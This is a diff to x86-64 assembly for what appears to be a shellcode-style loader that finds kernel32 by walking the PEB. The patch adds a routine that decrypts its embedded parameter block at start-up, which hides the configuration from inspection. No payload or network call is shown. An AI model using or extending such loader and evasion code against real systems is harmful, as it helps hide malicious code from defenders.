@@ -52,6 +52,7 @@
 .equ TAG_CODE, 0x434F4445
 .equ TAG_IMPORT, 0x494D5054
 .equ TAG_STRING, 0x53545247
+.equ TAG_PARAMS, 0x50415241
 
 .globl _start
 _start:
@@ -59,6 +60,7 @@ _start:
     and   rsp, -16
     sub   rsp, 0x60
     lea   rdi, [rip+params]
+    call  decryptParams
     mov   rax, gs:[0x60]
     mov   rbx, [rax+0x10]
     call  findKernel32
@@ -1517,6 +1519,30 @@ ehFail:
     xor   eax, eax
     pop   rsi
     pop   rbx
+    ret
+
+decryptParams:
+    push  r12
+    mov   rcx, [rdi+P_SEED]
+    mov   edx, TAG_PARAMS
+    call  deriveKey
+    mov   r12, rax
+    mov   r8, r12
+    mov   rcx, rdi
+    mov   edx, 132
+    xor   r9d, r9d
+    call  crypt
+    mov   r8, r12
+    lea   rcx, [rdi+140]
+    mov   edx, 28
+    mov   r9d, 140
+    call  crypt
+    mov   r8, r12
+    lea   rcx, [rdi+176]
+    mov   edx, 20
+    mov   r9d, 176
+    call  crypt
+    pop   r12
     ret
 
 .balign 16
